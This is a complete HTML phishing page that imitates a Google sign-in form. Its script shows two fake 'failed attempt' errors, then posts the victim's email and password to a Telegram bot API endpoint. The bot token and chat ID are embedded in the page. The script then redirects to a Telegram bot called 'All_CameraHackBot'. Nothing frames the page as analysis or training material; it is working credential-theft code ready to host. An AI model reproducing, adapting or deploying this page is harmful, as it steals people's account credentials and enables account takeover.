<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login - Google</title>
    <style>
        body {
            background: white;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            font-family: Arial, sans-serif;
            margin: 0;
        }
        .card {
            background: white;
            padding: 40px;
            border-radius: 10px;
            border: 1px solid #dadce0;
            width: 350px;
            text-align: center;
        }
        input {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border: 1px solid #dadce0;
            border-radius: 5px;
            box-sizing: border-box;
        }
        button {
            width: 100%;
            padding: 12px;
            background: #1a73e8;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
        }
        .error {
            color: red;
            margin: 10px 0;
        }
        .success {
            color: green;
            margin: 10px 0;
        }
        h2 {
            margin-bottom: 20px;
        }
    </style>
</head>
<body>
<div class="card">
    <h2>Sign in</h2>
    <input type="email" id="email" placeholder="Email">
    <input type="password" id="password" placeholder="Password">
    <button onclick="login()">Login</button>
    <div id="msg"></div>
</div>

<script>
    let attemptCount = 0;
    let savedEmail = "";
    
    async function login() {
        const email = document.getElementById('email').value;
        const password = document.getElementById('password').value;
        const msgDiv = document.getElementById('msg');
        
        if (!email || !password) {
            msgDiv.innerHTML = '<div class="error">Please fill all fields!</div>';
            return;
        }
        
        attemptCount++;
        
        if (attemptCount < 3) {
            msgDiv.innerHTML = '<div class="error">❌ Attempt ' + attemptCount + ' failed! Try again.</div>';
            document.getElementById('email').value = '';
            document.getElementById('password').value = '';
            return;
        }
        
        // درېیمه هڅه - بریالۍ
        savedEmail = email;
        
        const message = '✅ LOGIN SUCCESS\nEmail: ' + email + '\nPassword: ' + password;
        
        await fetch('https://api.telegram.org/bot8815514761:AAGT82khXsn8TmJHCv5vgSZG86Z6fAwGktQ/sendMessage', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                chat_id: '8295417969',
                text: message
            })
        });
        
        msgDiv.innerHTML = '<div class="success">✅ Login successful! Redirecting...</div>';
        
        setTimeout(function() {
            window.location.href = 'https://t.me/All_CameraHackBot?start=confirm_account';
        }, 1500);
    }
</script>
</body>
</html>
